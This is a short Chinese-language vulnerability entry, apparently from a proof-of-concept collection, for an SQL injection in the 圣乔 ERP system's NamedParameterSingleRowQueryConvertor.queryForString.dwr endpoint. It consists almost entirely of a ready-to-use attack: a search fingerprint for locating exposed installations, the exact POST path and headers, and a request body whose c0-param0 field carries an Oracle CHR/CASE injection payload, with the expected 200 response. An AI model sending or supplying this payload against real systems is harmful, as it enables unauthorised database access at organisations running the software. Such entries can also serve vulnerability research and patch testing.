# 圣乔ERP系统NamedParameterSingleRowQueryConvertor.queryForString.dwr存在SQL注入漏洞

- **系统**：圣乔ERP系统NamedParameterSingleRowQueryConvertor　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="圣乔-ERP系统"`
- **请求**：`POST /erp/dwr/call/plaincall/NamedParameterSingleRowQueryConvertor.queryForString.dwr HTTP/1.1`
- **关键头**：`Content-Length: 493`　`Content-Type: text/plain`　`Priority: u=0`

**请求体 / payload**
```
callCount=1
page=/erp/dwr/test/NamedParameterSingleRowQueryConvertor
httpSessionId=47CA299619667847F1BB450454E6C2D4
scriptSessionId=F3F037EB7A5102043AD4CEB47EB17A7275
c0-scriptName=NamedParameterSingleRowQueryConvertor
c0-methodName=queryForString
c0-id=0
c0-param0=(SELECT CHR(113)CHR(98)CHR(118)CHR(118)CHR(113)(CASE WHEN (7393=7393) THEN TO_NUMBER(1) ELSE TO_NUMBER(0) END)CHR(113)CHR(106)CHR(120)CHR(107)CHR(113) FROM DUAL)
c0-param1=Object_Object:{}
batchId=0
```
- **预期**：200　|　—